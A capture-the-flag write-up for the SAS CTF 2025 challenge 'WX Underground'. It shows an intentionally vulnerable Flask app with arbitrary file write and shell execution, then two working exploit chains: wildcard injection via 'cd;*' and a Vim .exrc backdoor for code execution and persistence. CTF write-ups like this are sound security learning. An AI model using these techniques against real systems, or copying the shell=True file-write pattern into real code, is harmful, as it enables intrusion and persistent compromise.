---
title: "WX Underground - SAS CTF 2025 Quals"
category: "web"
subcategory: "firmware"
type: "writeup"
tags: ["web", "flask", "firmware", "privesc", "subprocess", "underground", "sas-ctf-2025-quals", "2025", "ctf-writeup"]
summary: "Decades ago, the great city of Cockbit was wiped from the map of our world."
source:
  name: "CTFtime writeup #40291"
  url: "https://ctftime.org/writeup/40291"
original_source: "https://github.com/Danr0/sas-ctf-writeup/blob/main/wx_misc.md"
ctf:
  name: "SAS CTF 2025 Quals"
  year: 2025
  challenge: "WX Underground"
---

## Metadata

- **CTF:** SAS CTF 2025 Quals
- **Task:** WX Underground
- **Author team:** LCD
- **CTFtime:** <https://ctftime.org/writeup/40291>
- **Original writeup:** <https://github.com/Danr0/sas-ctf-writeup/blob/main/wx_misc.md>

---
## WX Underground

### Task intro  
Description of the task:

```  
Decades ago, the great city of Cockbit was wiped from the map of our world. Ever since, nestled amid the forsaken stones of the once-mighty city, a hidden corridor stirs to life for a day in a year. What lies at its end defies the understanding of conventional science. Those few who have returned speak of IT with ceaseless awe. Only true hero can surpass all the obstacles and emerge victory over this dangerous creature. If only we knew who can instill hope to the hearts of oppressed...  
```

We are given python server with possibilty of arbitary file wrtie and arbitary command, but limited to 4 characters.  
```py  
from flask import Flask, request, send_file  
import subprocess

app = Flask(__name__)

# Inspired by and derived from <https://ctftime.org/task/30126>  
@app.route('/write', methods=['POST'])  
def write():  
filename = request.args.get('filename', '')  
content = request.get_data()  
try:  
with open(filename, 'wb') as f:  
f.write(content)  
f.flush()  
return 'OK'  
except Exception as e:  
return str(e), 400

@app.route('/exec')  
def execute():  
cmd = request.args.get('cmd', '')  
if len(cmd) > 4:  
return 'Command too long', 400  
if "|" in cmd:  
return 'No pipi racing this time :(', 400  
try:  
output = subprocess.check_output(cmd, shell=True)  
return output  
except Exception as e:  
return str(e), 400

if __name__ == '__main__':  
app.run(host='0.0.0.0', port=7331)

```

We need to execute compiled binary with 5 arguments to read the flag:  
```cpp  
#include <stdio.h>  
#include <string.h>  
#include <unistd.h>

// Inspired by and derived from <https://ctftime.org/task/30126>  
int main(int argc, char *argv[]) {  
char full_cmd[256] = {0};   
for (int i = 1; i < argc; i++) {  
strncat(full_cmd, argv[i], sizeof(full_cmd) - strlen(full_cmd) - 1);  
if (i < argc - 1) strncat(full_cmd, " ", sizeof(full_cmd) - strlen(full_cmd) - 1);  
}

if (strstr(full_cmd, "tung tung tung tung sahur")) {  
FILE *flag = fopen("/flag.txt", "r");  
if (flag) {  
char buffer[1024];  
while (fgets(buffer, sizeof(buffer), flag)) {  
printf("%s", buffer);  
}  
fclose(flag);  
return 0;  
}  
}

printf("Konon katanya kalau ada orang yang dipanggil Sahur tiga kali dan tidak nyaut maka makhluk ini datang di rumah kalian: %s\n", full_cmd);  
return 1;  
}

```

## Solution 1: Wildcard Injection

I like CTF challenges, which use real-world patterns. In this task we have the ability to use special characters and commands in Bash because of the option `shell=True`. We can't use pipes, but wildcard `*` and the new command via `;` are still available for us. We can remember bash script misconfigurations, which lead to privilege escalation. And the main idea is [Wildcard Injection](<https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/>). We can create arbitrary files and call them as arguments via `*`. But we have only 4 characters; from where can we use this attack? We are not root, so my first assumption was `/tmp`. But this will not work, because we can't traverse to there. The second assumption was to use a double wildcard `/*/*` and this is better but not good enough. We need another writable path. Let's just search for it:  
```bash  
$ find / -exec test -w {} \; -exec echo {} \; 2>/dev/null  
/proc/sys/kernel/ns_last_pid  
/proc/keys  
<proc paths>  
/home/patapim  
/sys/firmware  
/dev/pts/0  
/dev/pts/ptmx  
/dev/mqueue  
/dev/shm  
/dev/null  
/dev/random  
/dev/full  
/dev/tty  
/dev/zero  
/dev/urandom  
/dev/ptmx  
/dev/stdin  
/dev/stdout  
/dev/stderr  
/dev/core  
/var/tmp  
/tmp  
```

And we can see the home folder `/home/patapim`, which can be very useful. This is because the `cd` command without arguments will move to it. We can traverse and do wildcard injection by `cd;*`. Before executing, we need to create a full command. Only limitation: that output of wildcard is sorted. We have to be creative and call chmod on our sh script. We can construct the next chmod command `chmod u+x z`, which is sorted. After we add executable permission to the payload, we can just call it by the special variable `~`.  
```bash  
$ curl "http://127.0.0.1:7331/write?filename=/home/patapim/z" -d "/tung tung tung tung tung sahur"  
OK%  
$ curl "http://127.0.0.1:7331/write?filename=/home/patapim/u%2bx" -d "u+x"  
OK%  
$ curl "http://127.0.0.1:7331/write?filename=/home/patapim/chmod" -d "chmod"  
OK%  
$ curl "http://127.0.0.1:7331/exec?cmd=cd;*"  
$ curl "http://127.0.0.1:7331/exec?cmd=~/z"  
SAS{example}  
```

## Solution 2: Vim backdoor

Another way to solve it is to backdoor vim. We can change the configuration file for Vim and then execute it. This is realword way to achieve persistence on a system or read all writable data.  
```bash  
$ curl "http://127.0.0.1:7331/write?filename=/home/patapim/a" -d "/tung tung tung tung tung sahur"  
OK%  
$ curl "http://127.0.0.1:7331/write?filename=/home/patapim/.exrc" -X POST --data '!chmod 777 ~/a'  
OK%  
$ curl "http://127.0.0.1:7331/exec?cmd=vi"  
Command 'vi' returned non-zero exit status 1.%  
$ curl "http://127.0.0.1:7331/exec?cmd=~/a"  
SAS{example}  
```
